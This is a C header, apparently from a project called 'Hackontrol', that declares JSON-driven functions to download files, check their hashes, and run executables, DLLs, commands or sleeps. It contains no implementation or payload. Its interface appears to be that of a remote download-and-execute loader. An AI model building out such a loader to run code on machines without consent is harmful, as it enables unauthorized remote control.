#pragma once

#include <libkhopan.h>
#include <cJSON.h>

typedef void(__stdcall* ENTRYPOINTFUNCTION) (const cJSON* const root, const LPCWSTR folderHackontrol);

typedef struct {
	LPCSTR fullName;
	LPCSTR shortName;
	ENTRYPOINTFUNCTION function;
} EXECUTEENTRYPOINT;

LPWSTR ExecuteGetFile(const cJSON* const root, const LPCWSTR folderHackontrol);
BOOL ExecuteHashFileCheck(const cJSON* const root, const LPCWSTR file);
void ExecuteDownload(const cJSON* const root, const LPCWSTR folderHackontrol);
void ExecuteExecute(const cJSON* const root, const LPCWSTR folderHackontrol);

void _stdcall ExecuteEntrypointExecutable(const cJSON* const root, const LPCWSTR folderHackontrol);
void _stdcall ExecuteEntrypointDynamic(const cJSON* const root, const LPCWSTR folderHackontrol);
void _stdcall ExecuteEntrypointCommand(const cJSON* const root, const LPCWSTR folderHackontrol);
void _stdcall ExecuteEntrypointSleep(const cJSON* const root, const LPCWSTR folderHackontrol);
